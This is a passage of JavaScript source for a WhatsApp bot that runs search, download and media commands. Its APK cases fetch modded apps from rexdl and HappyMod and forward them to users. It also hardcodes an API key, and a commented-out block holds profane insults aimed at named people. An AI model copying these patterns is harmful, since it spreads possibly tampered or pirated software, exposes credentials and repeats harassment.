		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                let result = anu[Math.floor(Math.random() * anu.length)]
                SkyzeeBOT.sendMessage(m.chat, { image: { url: result }, caption: '${themeemoji} Media Url : '+result }, { quoted: m })
            }
            break
case 'webtonsearch': case 'webtoon':
                if (!text) return reply('What Are you Looking For??')
                await reply(mess.wait)
                xeonkey.Webtoons(q).then(async data => {
                    let txt = `*------「 WEBTOONS-SEARCH 」------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*👍🏻 Like :* ${i.like}\n`
                        txt += `*🤴🏻 Creator :* ${i.creator}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n ----------------------------------------------------------\n`
                    }
                    await reply(txt)
                })
                .catch((err) => {
                    reply(mess.error)
                })
            break
            case 'wattpad': {
            if (!text) return reply(`Example : ${prefix + command} love`)
            let res = await fetchJson(`https://zenzapis.xyz/webzone/wattpad?query=$text}&apikey=hdiiofficial`)
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From query\n\n`
            capt += ` Title: ${judul}\n`
            capt += ` Read: ${dibaca}\n`
            capt += ` Vote: ${divote}\n`
            capt += ` Chapter: ${bab}\n`
            capt += ` Url: ${url}\n`
            capt += ` Description: ${description}`
            SkyzeeBOT.sendImage(m.chat, thumb, capt, m)
            }
            break
case 'apk': case 'apkmod': case 'apkdl': {
  if (!q) return reply(`Use${prefix + command} whatsapp`) 
  let noh = require('./lib/myfunc2')                
  noh.rexdl(`${q}`).then(async (data) => {
  let sections = []   
  for (let i of data) {
  const list = {title: `${i.judul}`,
  rows: [
	    {
	     title: `${i.judul}`, 
	     rowId: `${prefix}donlod ${i.link}`,
	     description: `Category: ${i.kategori}\nPublish: ${i.upload_date}\nInfo: ${i.deskripsi}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  SkyzeeBOT.sendMessage(
      m.chat, 
      {
       text: `${ucapannya2} ${pushname} *Search Results From ${q} Click the button below to choose*`,
       footer: `${botname}`,
       title: "*APK DOWNLOADER,*",
       buttonText: "CLICK HERE",
       sections
      }, { quoted : m })                 
                }).catch((err) => {
                    reply(`*${q} Not found*`)
                })
            }
            break
case 'donlod': {
                if (!text) return reply(`Use${prefix + command} whatsapp`)
                if (!isUrl(args[0]) && !args[0].includes('rexdl.com')) reply('*The link you provided is invalid*')
           let rex = require('./lib/ApkDown.js')
           rex.ApkDown(`${text}`).then(async (anu) => {        
           if (anu[0].size.split('MB')[0] >= 150) return reply('*File Over Limit* '+util.format(anu))
           for (let i of anu) {    
           linkye = `*APK DOWNLOAD*\n\n*Title:* ${i.title}\n*Updated:* ${i.up}\n*Version:* ${i.vers}\n*Size:* ${i.size}\n*Url:* \n*Desc:* ${i.desc}`         
                SkyzeeBOT.sendMessage(m.chat, { image: await getBuffer(i.thumb), jpegThumbnail: await getBuffer(i.thumb), caption: `${linkye}` }, { quoted: m })
                SkyzeeBOT.sendMessage(m.chat, {document: await getBuffer(i.link), mimetype: `application/vnd.android.package-archive`, fileName: `${i.title}`}, {quoted:m})  
                }  
                }).catch((err) => {
                    reply(mess.error)
                }) 
                }                          
                break
case 'tagme': {
SkyzeeBOT.sendMessage(m.chat, {text:`*@${m.sender.split("@")[0]}*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break
           case 'git': case 'gitclone':
	reply(mess.wait)
            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            if (!args[0]) reply(`Use ${prefix}gitclone repo link\nExample: https://github.com/DGXeon/CheemsBot-MD4`)
    if (!regex1.test(args[0])) return reply(mess.linkm)
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    SkyzeeBOT.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
			break

            case 'drakorxxx':
                if (!text) return reply('What Are You Looking For??')
                await reply(mess.wait)
                xeonkey.Drakor(`${text}`).then(async data => {
                    let txt = `*-----「 DRAKOR-SEARCH 」-----*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📆 Years :* ${i.years}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n-----------------------------------------------------\n`
                    }
                    await sendFileFromUrl(from,data[0].thumbnail,txt,m)
                })
                .catch((err) => {
                    reply(mess.error)
                })
            break
            case 'drakor': {
            if (!text) return reply(`Example : ${prefix + command} love`)
            let res = await fetchJson(`https://zenzapis.xyz/webzone/drakor?query=${text}&apikey=hdiiofficial`)
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `${themeemoji} Title: ${i.judul}\n`
            capt += `${themeemoji} Years: ${i.years}\n`
            capt += `${themeemoji} Genre: ${i.genre}\n`
            capt += `${themeemoji} Url: ${i.url}\n`
            capt += `${themeemoji} Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            SkyzeeBOT.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'animexxx':{
                if (!text) return reply(`What Anime Are You Looking For??`)
                await reply(mess.wait)
                xeonkey.Anime(q).then(async data => {
                    let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Watch🎥",
						"url": `${websitex}`
						}
					}
				]
				await SkyzeeBOT.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                // if (notButtons) await SkyzeeBOT.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    reply(mess.error)
                })
                }
            break
            case 'characterxxx': case 'karakterxxx':
                if (!text) return reply(`What Anime Character Are You Looking For??`)
                await reply(mess.wait)
                xeonkey.Character(q).then(async data => {
                    let txt = `*---「 CHARACTER-SEARCH 」---*\n\n`
                    for (let i of data) {
                        txt += `*📫 Character :* ${i.character}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "YouTube📍",
						"url": `${websitex}`
						}
					}
				]
				await SkyzeeBOT.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    reply(mess.error)
                })
            break
            case 'manga2':
                if (!text) return reply(`What Manga Are You Looking For??`)
                await reply(mess.wait)
                xeonkey.Manga(`${text}`).then(async data => {
                    let txt = `*------「 MANGA-SEARCH 」------*\n\n`
                    for (let i of data) {
                         txt += `*📫 Title :* ${i.judul}\n`
                         txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "YouTube📍",
						"url": `${websitex}`
						}
					}
				]
				await SkyzeeBOT.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    reply(mess.error)
                })
                case 'anime':
	    if(!q) return reply(`Which anime do you want to search?\nExample ${prefix}manga naruto`)
reply(mess.wait)						
const { Anime } =require("@shineiichijo/marika")
    const client = new Anime();
     let anime = await client.searchAnime(q)
    let result = anime.data[0];
    console.log(result)
   let details = `🎀 *Title: ${result.title}*\n`;
    details += `🎋 *Format: ${result.type}*\n`;
    details += `📈 *Status: ${result.status.toUpperCase().replace(/\_/g, " ")}*\n`;
    details += `🍥 *Total episodes: ${result.episodes}*\n`;
    details += `🎈 *Duration: ${result.duration}*\n`;
    details += `🧧 *Genres:*\n`;
    for (let i = 0; i < result.genres.length; i++) {
      details += `\t\t\t\t\t\t\t\t*${result.genres[i].name}*\n`;
    }
    details += `✨ *Based on: ${result.source.toUpperCase()}*\n`;
    details += `📍 *Studios:*\n`;
    for (let i = 0; i < result.studios.length; i++) {
      details += `\t\t\t\t\t\t\t\t*${result.studios[i].name}*\n`;
    }
    details += `🎴 *Producers:*\n`;
    for (let i = 0; i < result.producers.length; i++) {
      details += `\t\t\t\t\t\t\t\t\t\t*${result.producers[i].name}*\n`;
    }
    details += `💫 *Premiered on: ${result.aired.from}*\n`;
    details += `?? *Ended on: ${result.aired.to}*\n`;
    details += `🎐 *Popularity: ${result.popularity}*\n`;
    details += `🎏 *Favorites: ${result.favorites}*\n`;
    details += `🎇 *Rating: ${result.rating}*\n`;
    details += `🏅 *Rank: ${result.rank}*\n\n`;
    if (result.trailer.url !== null)
      details += `♦ *Trailer: ${result.trailer.url}*\n\n`;
    details += `🌐 *URL: ${result.url}*\n\n`;
    if (result.background !== null)
      details += `🎆 *Background:* ${result.background}*\n\n`;
    details += `❄ *Description:* ${result.synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`
SkyzeeBOT.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
break
case 'manga':
reply(mess.wait)						
const { Manga } =require("@shineiichijo/marika")
const manga = new Manga();
if(!q) return reply(`Which manga do you want to search?\nExample ${prefix}manga naruto`)
let srh = await manga.searchManga(q)
    let mang = `🎀 *Title: ${srh.data[0].title}*\n`;
    mang += `📈 *Status: ${srh.data[0].status}*\n`;
    mang += `🌸 *Total Volumes: ${srh.data[0].volumes}*\n`;
    mang += `🎗 *Total Chapters: ${srh.data[0].chapters}*\n`;
    mang += `🧧 *Genres:*\n`;
    for (let i = 0; i < srh.data[0].genres.length; i++) {
      mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
    }
    mang += `✨ *Published on: ${srh.data[0].published.from}*\n`;
    mang += `🌟 *Score: ${srh.data[0].scored}*\n`;
    mang += `🎐 *Popularity: ${srh.data[0].popularity}*\n`;
    mang += `🎏 *Favorites: ${srh.data[0].favorites}*\n`;
    mang += `✍ *Authors:*\n`;
    for (let i = 0; i < srh.data[0].authors.length; i++) {
      mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* *(${srh.data[0].authors[0].type})*\n`;
    }
    mang += `\n🌐 *URL: ${srh.data[0].url}*\n\n`;
    if (srh.data[0].background !== null)
      mang += `🎆 *Background:* ${srh.data[0].background}`;
    mang += `❄️ *Description:* ${srh.data[0].synopsis.replace(
      /\[Written by MAL Rewrite]/g,
      ""
    )}`;
SkyzeeBOT.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
break
            break
// case 'lyrics': {
// // SE REQUIERE PONER NOMBRE DEL AUTOR
// // DIVIDIR AUTOR Y CANCIÓN CON "|"
// // DIVIDIR ESPACIOS
// 		            	if (isBan) return replywarn(mess.ban)
// 	if (isBanChat) return replywarn(mess.ban)
// 	    if (!text) return reply(`Use example ${prefix}lyrics Despacito`)
// 	reply(mess.wait)
// 	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
//     let result = await lyricsv2(text).catch(async _ => await lyrics(text))
//     reply(`
// ${themeemoji} Title : *${result.title}*
// ${themeemoji} Author : ${result.author}
// ${themeemoji} Lyrics : ${result.lyrics}
// ${themeemoji} Url : ${result.link}
// `.trim())
// }
// break
case 'earthquake':
const tres = await Gempa()
var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
console.log(Map)
const captt = `Time : ${Waktu}\nLatitude : ${Lintang}\nLongitude : ${Bujur}\nRegion : ${Wilayah}`
SkyzeeBOT.sendMessage(from, { image : { url : Map }, caption : captt})
break
case 'covidindo':
case 'covid':
const c = await covid()
var { kasus, kematian, sembuh } = c[0]
SkyzeeBOT.sendMessage(from, {text : `Case : ${kasus}\n\nDead : ${kematian}\n\nHealed : ${sembuh}`}, m)
break
case 'tvschedule':
if (!q) return reply('Send orders *#tvschedule [channel]*')
reply(await jadwaltv(q))
break
case 'schedule': {
    if (!args[0]) return reply('Agregá un tiempo (en segundos) para establecer el temporizador')
    timer = args[0]
    days = Math.floor(timer / 86400)
    hours = Math.floor(timer / 3600 - (days * 24))
    minutes = Math.floor(timer / 60) - (Math.floor(timer / 3600) * 60)
    seconds = timer - (Math.floor(timer / 60) * 60)
    if (timer < 60) reply(`temporizador establecido para dentro de *${seconds}s*!`)
    else if (timer < 3600) reply(`temporizador establecido para dentro de *${minutes}m* y *${seconds}s*!`)
    else if (timer < 86400) reply(`temporizador establecido para dentro de *${hours}h*, *${minutes}m* y *${seconds}s*!`)
    else if (timer > 86400) reply(`temporizador establecido para dentro de *${days}d*, *${hours}h*, *${minutes}m* y *${seconds}s*!`)
    if (isQuotedVideo || isQuotedAudio || isQuotedImage || isQuotedSticker) {
        media = downloadAndSaveMediaMessage(quoted)
        setTimeout(function() {
            SkyzeeBOT.sendMessage(m.chat, {url: media}, m)
        }, timer * 1000)
    } else {
        mensaje = quoted ? isMedia : mime // q.replace(args[0], '')
        setTimeout(function() {
            SkyzeeBOT.sendText(m.chat, mensaje, m)
        }, timer * 1000)
    }
} break
case 'playstore': case 'apk':
if(!q) return reply('what are you looking for?')
let play = await hx.playstore(q)
let storee = '❉─────────────────────❉\n'
for (let i of play){
storee += `\n*「 *PLAY STORE* 」*\n
- *Name* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Dev Link* : ${i.link_dev}\n❉─────────────────────❉`
}
reply(storee)
break
case 'film':
	reply(mess.wait)
if (!q) return reply(`What film you wanna search?\nExample: ${prefix}film Spiderman`)
xeonkey.Film(q)
    .then(data => {console.log(data)
    let krl = `*❒「  Film ${q} 」*\n*🌿 Author* : ${data[0].author}\n\n`
			    for (let i of data) {
                krl += (`\n────────────────────\n\n *📍Title :* ${i.judul}\n *📟 Quality :* ${i.quality}\n *🖥️ Type : ${i.type}*\n *⌛ Uploaded :* ${i.upload}\n *🌍 Source :* ${i.link}`)
                }
               SkyzeeBOT.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
});
break
case 'img':
case 'image': {
                reply(mess.wait)
		let { pinterest } = require('./lib/scraperW')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                SkyzeeBOT.sendMessage(m.chat, { image: { url: result }, caption: ` ${themeemoji} Media Url : `+result }, { quoted: m })
            }
            break
case 'mcserver': case 'mcquery': {
if (!args.join(" ")) return replay(`Example : \n${prefix + command} ip|port\nUses : \n${prefix + command} play.xeon.com|19132`)
const Query = require("minecraft-query");

const qury = args.join(" ")
const iphost = qury.split("|")[0];
const portnya = qury.split("|")[1];

if (!iphost) return replay(`Where's your ip?`)
if (!portnya) return replay(`Where's the port??`)

const q = new Query({host: iphost, port: portnya, timeout: 7500});

q.fullStat()
.then(success => {
replay(jsonformat(success));
return q.basicStat()
})
.then(success => {
replay(jsonformat(success));
q.close();
})
}
break
case 'mcpedl': {
if (!args.join(" ")) return replay(`Example : ${prefix + command} shader`)
xeontod.mcpedl(args.join(" ")).then(async(res) => {
teks = `*| MCPEDL SEARCH |*`
for (let i of res) {
teks += `\n\nName : ${i.name}\nCategory : ${i.category}\nDate : ${i.date}\nDesc : ${i.desc}\nLink : ${i.link}`
}
let msg = {
image: log0,
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
headerType: 4
}
SkyzeeBOT.sendMessage(m.chat, msg, { quoted: m })
})
}
break
case 'happymod': {
if (!args.join(" ")) return replay(`Example : ${prefix + command} mobile legend`)
xeontod.happymod(args.join(" ")).then(async(res) => {
teks = '```「 HappyMod Search 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
let msg = {
image: {url:res[0].icon},
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
headerType: 4
}
SkyzeeBOT.sendMessage(m.chat, msg, { quoted: m })
})
}
break
case 'searchgc': {
if (args.length < 1) return replay(`Example :\n${prefix}searchgc Classy Editor`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
let buttonMessage = {
image: log0,
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
headerType: 4
}
SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case 'servermc': {
    if (!q) return reply('Agrega el país')
xeontod.servermc(q).then(async(res) => {
let teks = `*| MINECRAFT SERVER |*\n\nServers encontrados en "${q}"...\n\n`
let no = 1
for (let i of res) {
teks += `${themeemoji} Server To ${no++}\nip : ${i.ip}\nport : ${i.port}\nversi : ${i.versi}\nplayer : ${i.player}\n\n`
}
let buttonMessage = {
image: log0,
jpegThumbnail: thum,
caption: teks,
footer: `${global.botname}`,
headerType: 4
}
SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
// case "meme":
//    if (isBan) return replywarn(mess.ban)	 			
// if (isBanChat) return replywarn(mess.ban)
//   var res = await JalanTikusMeme()
// teks = [
//     "Considero que yo soy mi propio dios🤯😱 y sé que eso suena muy narcisista pero te explico 🙄😍yo creo que los seres humanos somos el universo🌍✨🙅 mismo experimentandose de manera conciente 💥🥺y si dios es todo 🧠😸por lo tanto no nos hizo, somos 👽😈así que si dios es el universo nosotros no somos parte del universo 🌍😍somos el universo entonces somos dios 🙀✨🌟💯 También de manera metafórica 🧠🥺 considero que dios es artista 🧑‍🎨✨por ser creador así que para mi cada artista es un dios 😸✍️yo me considero artista o aspirante artista 🙋🌈así que para mí soy mi propio dios 💥🌍está idea me empodera y me da fuerzas para yo hacer de mi vida lo que yo quiera 💪❤️‍🔥y me mantiene bastante feliz ☺️sin embargo si tú me preguntas si creo en la iglesia 🤔✝️ no, no creo en la iglesia ✝️❌pero si creo que cada ser humano necesita de algo en que creer 🧠🥰y algo en que tenerle fé😱🌞, yo le tengo fé al arte así que esa es mi religión 🧑‍🎨✝️",
//     "😂😂😂", "eu amigo reíte", "hahaha eu ri muito irmão", "XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD", "when your mom:", "yo", "my honest reaction",
//     "Si idiot*, si, si le lloro a un personaje que no existe y cuál es tu p*to problema, te burlas de el como se siente alguien sobre algún tema y sobre todo das opiniones que sabes que incomodan a los demás, Itachi y L también fueron personajes importantes y tú no sabes cómo hay gente que les lloro, y así como hay gente que los lloro a ellos yo le lloro a Bakugou, ese personaje que para ti te puede parecer irrelevante para alguien puede ser un soporte emocional y no, no es una exageración, y no es solo un pixel, para ti puede ser solo eso pero para alguien más puede significar muchas cosas, así que mejor cállate y no des opiniones que claramente le molestan e incomodan a las demás personas y sobre todo te burlas de las fans que si quieren a este personaje", "QUE TE RÍES PUTO ANORMAL DE MIERDA? USTEDES NO ENTIENDEN UNA MIERDA POR LO QUE PASO POR SER HOMOSEXUAL, USTEDES CREEN QUE TODO ES UN PUTO CHISTE, NO PIENSAN NI UN POCO COMO ESTOY YO POR DETRÁS DE TODO, ME JUNTO CON USTEDES JUSTA MENTE PARA NO LLORAR PENSANDO QUE SOY UN PUTO BICHO RARO. PARA USTEDES YO SOY UN PUTO CHISTE DE MIERDA, Y SI TANTO QUIEREN SER MIS AMIGOS MINIMO PONGANSE A PENSAR COMO ESTOY YO EMOCIONALMENTE O ALGO POR EL ESTILO, SOLO POR ESO ME JUNTO CON BANEL, AUN EL SIENDO UNA MIERDA DE PERSONA SE PREOCUPA POR MI SALUD MENTAL Y NO ANDA MAMANDO. @Matixks NUNCA SERE TU PUTO AMIGO, NUNCA EN MI PUTA VIDA TE CONCIDERARE UN AMIGO, POR QUE ERES UN IMBECIL DE MIERDA QUE SUS PAPÁS LE REGALARON UNA PC GAMER PARA QUE NO LES ESTE CHINGANDO LA VIDA, AUN ASÍ LA CAGAS EN EL COLEGIO PELIANDOTE CON MORRAS. @Alek¿ GRACIAS A MI ESTAS AQUI HABLANDO CON TODOS PUTA ZORRA DE MIERDA, Y SI, YO TE AMO, PERO QUE TE JODAN ANORMAL",
//     `⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
// ⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
// ⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
// ⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
// ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
// ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
// ⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
// ⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
// ⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
// ⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
// ⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄`,
//     "bana vos hablas de basquet y cuando te vi jugar eras un desastre fuiste a jugar con los de no se quien eran los del country estabas en el espejo hacia asi asi y cuando salías ni la tocabas y hoy hablas como si jugaras como lebron james como ginobilli",
//     "😰😰😰😰"
// ]
// random = teks[Math.floor(Math.random() * teks.length)]
// SkyzeeBOT.sendMessage(m.chat, { image : { url : res }, caption: random }, { quoted : m })
// break
            case 'cinemaschedule': {
            if (!text) return reply(`Example: ${prefix + command} jakarta`)
            let res = await fetchJson(`https://zenzapis.xyz/webzone/jadwalbioskop?kota=${text}&apikey=hdiiofficial`)
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += ` Title: ${i.title}\n`
            capt += ` Thumbnail: ${i.thumb}\n`
            capt += ` Url: ${i.url}\n\n──────────────────────\n`
            }
            SkyzeeBOT.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
case 'shortstoryx':{
if (!q) return reply(`*List*\n${prefix}shortstory Anak\n${prefix}shortstory Bahasa Daerah\n${prefix}shortstory Bahasa Inggris\n${prefix}shortstory Bahasa Jawa\n${prefix}shortstory Bahasa Sunda\n${prefix}shortstory Budaya\n${prefix}shortstory Cinta\n${prefix}shortstory Cinta Islami\n${prefix}shortstory Cinta Pertama\n${prefix}shortstory Cinta Romantis\n${prefix}shortstory Cinta Sedih\n${prefix}shortstory Cinta Segitiga\n${prefix}shortstory Cinta Sejati\n${prefix}shortstory Galau\n${prefix}shortstory Gokil\n${prefix}shortstory Inspiratif\n${prefix}shortstory Jepang\n${prefix}shortstory Kehidupan\n${prefix}shortstory Keluarga\n${prefix}shortstory Kisah Nyata\n${prefix}shortstory Korea\n${prefix}shortstory Kristen\n${prefix}shortstory Liburan\n${prefix}shortstory Lingkungan\n${prefix}shortstory Lucu\n${prefix}shortstory Malaysia\n${prefix}shortstory Mengharukan\n${prefix}shortstory Misteri\n${prefix}shortstory Motivasi\n${prefix}shortstory Nasihat\n${prefix}shortstory Nasionalisme\n${prefix}shortstory Olahraga\n${prefix}shortstory Patah Hati\n${prefix}shortstory Penantian\n${prefix}shortstory Pendidikan\n${prefix}shortstory Pengalaman Pribadi\n${prefix}shortstory Pengorbanan\n${prefix}shortstory Penyesalan\n${prefix}shortstory Perjuangan\n${prefix}shortstory Perpisahan\n${prefix}shortstory Persahabatan\n${prefix}shortstory Petualangan\n${prefix}shortstory Ramadhan\n${prefix}shortstory Remaja\n${prefix}shortstory Renungan\n${prefix}shortstory Rindu\n${prefix}shortstory Rohani\n${prefix}shortstory Romantis\n${prefix}shortstory Sastra\n${prefix}shortstory Sedih\n${prefix}shortstory Sejarah\n${prefix}shortstory Slice Of Life\n${prefix}shortstory Terjemahan\n${prefix}shortstory Thriller`)
let cerpe = await cerpen(q)
reply(`${global.themeemoji} _*Title :*_ ${cerpe.title}\n${global.themeemoji} _*Author :*_ ${cerpe.author}\n${global.themeemoji} _*Category :*_ ${cerpe.kategori}\n${global.themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${global.themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
case 'loveshortstoryx':{
let cerpe = await cerpen(`Cinta segitiga`)
        reply(`${themeemoji} _*Title :*_ ${cerpe.title}\n${themeemoji} _*Author :*_ ${cerpe.author}\n${themeemoji} _*Category :*_ ${cerpe.kategori}\n${themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
case 'islamicshortstoryx':{
let cerpe = await cerpen(`Cinta segitiga`)
        reply(`${themeemoji} _*Title :*_ ${cerpe.title}\n${themeemoji} _*Author :*_ ${cerpe.author}\n${themeemoji} _*Category :*_ ${cerpe.kategori}\n${themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
case 'disturbingshorystoryx':{
let cerpe = await cerpen(`galau`)
       reply(`${themeemoji} _*Title :*_ ${cerpe.title}\n${themeemoji} _*Author :*_ ${cerpe.author}\n${themeemoji} _*Category :*_ ${cerpe.kategori}\n${themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
case 'friendshipshortstoryx':{
let cerpe = await cerpen(`persahabatan`)
        reply(`${themeemoji} _*Title :*_ ${cerpe.title}\n${themeemoji} _*Author :*_ ${cerpe.author}\n${themeemoji} _*Category :*_ ${cerpe.kategori}\n${themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
case 'sacrificeshortstoryx':{
let cerpe = await cerpen(`Pengorbanan`)
reply(`${themeemoji} _*Title :*_ ${cerpe.title}\n${themeemoji} _*Author :*_ ${cerpe.author}\n${themeemoji} _*Category :*_ ${cerpe.kategori}\n${themeemoji} _*Pass Moderation :*_ ${cerpe.lolos}\n${themeemoji} _*Story :*_\n${cerpe.cerita}`)
}
break
	    case 'couplepp':  case 'ppcouple': {
                reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                SkyzeeBOT.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male🙎🏻‍♂️` }, { quoted: m })
                SkyzeeBOT.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female🙎🏻‍♀️` }, { quoted: m })
            }
	    break
            case 'animequotes': case 'animequote': {
		let { quotesAnime } = require('./lib/scraperW')
                let anu = await quotesAnime()
                let result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'wallpaper': {
                if (!args.join(" ")) return reply("What picture are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                let result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `${prefix}wallpaper ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: `${botname}`,
                    buttons: buttons,
                    headerType: 4
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break

case 'wiki': case 'wikipedia':
if (args.length < 1) return reply('What Are You Looking For?? ')
const res2 = await SkyzeeBOTWiki(q).catch(e => {
return reply('_[ ! ] Error Result Not Found_') 
}) 
const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
SkyzeeBOT.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
break
            case 'wikimedia': {
                if (!q) return reply(`Enter Query Title`)
